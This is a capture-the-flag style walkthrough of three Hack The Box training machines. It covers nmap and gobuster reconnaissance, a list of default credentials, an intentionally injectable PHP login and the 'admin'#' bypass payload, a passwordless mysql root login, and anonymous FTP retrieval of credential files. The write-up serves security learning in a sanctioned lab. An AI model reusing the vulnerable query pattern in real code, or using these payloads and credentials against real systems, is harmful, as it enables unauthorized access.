#  Machine: Appointment

## Exploit: SQL Injection 

Nmap is a tool used to find open ports on a target
- ```sudo nmap {target_IP}```
  - ```sudo nmap -sC -sV {target_IP}```
    - ```-sV``` switch, stands for version detection 
    - ```-sC``` performs a script scan using the default set of scripts
- *Apache HTTP Server is a free and open-source application that runs web pages on either physical or virtual
web servers. It is one of the most popular HTTP servers, and it usually runs on standard HTTP ports such as
ports 80 TCP, 443 TCP, and alternatively on HTTP ports such as 8080 TCP or 8000 TCP*

 ![appointment_nmap](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/appointment_nmap.png?raw=true)

Since port 80 is open (http) we can go to the IP in our browser

**Gobuster**
```git clone https://github.com/danielmiessler/SecLists.git``` command downloads the wordlist
```gobuster dir --url http://{target_IP}/ --wordlist {wordlist_location}/directory-list-2.3-small.txt -x php,html```

Default credentials
- admin:admin
- guest:guest
- user:user
- root:root
- administrator:password

SQL injection
example how authentication works 

```
<?php
mysql_connect("localhost", "db_username", "db_password"); # Connection to the SQL
Database.
mysql_select_db("users"); # Database table where user information is stored.
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.
$result=mysql_query($sql);
# Performs query stored in $sql and stores it in $result.
$count=mysql_num_rows($result);
# Sets the $count variable to the number of rows stored in $result.
if ($count==1){
 # Checks if there's at least 1 result, and if yes:
 $_SESSION['username'] = $username; # Creates a session with the specified $username.
 $_SESSION['password'] = $password; # Creates a session with the specified $password.
 header("location:home.php"); # Redirect to homepage.
 ```
 
 if we use **admin'#** in the username field,
 
 ```$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";```
 
 will read ```$sql="SELECT * FROM users WHERE username='admin'```, so password will be skipped with this SQL injection
 
![appointment_select](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/appointment_select.png?raw=true)

We can login with any password in the password field

![appointment_sql](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/appointment_sql.png?raw=true)

![appointment_sql1](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/appointment_sql1.png?raw=true)
 
#  Machine: Sequel

## Exploit: SQL database with mysql

- ```sudo nmap {target_IP}```
  - ```sudo nmap -sC -sV {target_IP}```
    - ```-sV``` switch, stands for version detection 
    - ```-sC``` performs a script scan using the default set of scripts

```sudo apt update && sudo apt install mysql*``` to download mysql

- ```mysql -h {target_IP} -u root```
  - -h : Connect to host.
  - -u : User for log-in if not current user.

![sequel_mysql](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/sequel_mysql.png?raw=true)

- mysql commands

```
SHOW databases; : Prints out the databases we can access.
USE {database_name}; : Set to use the database named {database_name}.
SHOW tables; : Prints out the available tables inside the current
database.
SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
```

  - ```SHOW databases;``` to see our databases
  - ```USE htb;``` to change database
  - ```SHOW tables;``` to check the tables
  - ```SELECT * FROM config;``` to see our query of config

![sequel_mysql1](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/sequel_mysql1.png?raw=true)

#  Machine: Crocodile

## Exploit: FTP

- ```sudo nmap {target_IP}```
  - ```sudo nmap -sC -sV {target_IP}```
    - ```-sV``` switch, stands for version detection 
    - ```-sC``` performs a script scan using the default set of scripts

![crocodile_nmap](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/crocodile_nmap.png?raw=true)

- Port 21 is open, ftp to the target IP
  - Use command ```get``` to download files from remote computer to the local computer
  - Use command ```bye``` to leave ftp

![crocodile_ftp](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/crocodile_ftp.png?raw=true)

- Use command ```cat``` (concatenate) to read data from file and output the contents

![crocodile_cat](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/crocodile_cat.png?raw=true)

**Gobuster**

```gobuster dir --url http://{target_IP}/ --wordlist {wordlist_location}/directory-list-2.3-small.txt -x php,html```

gobuster dir --url http://10.129.235.89 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html

![crocodile_gobuster](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/crocodile_gobuster.png?raw=true)

- ```http://{target_IP}/login.php``` page
  - Use the username and password files to log in
![crocodile_login](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/crocodile_login.png?raw=true)

![crocodile_flag](https://github.com/juliezard/HackTheBox/blob/main/Boxes/Tier%201/images/crocodile_flag.png?raw=true)
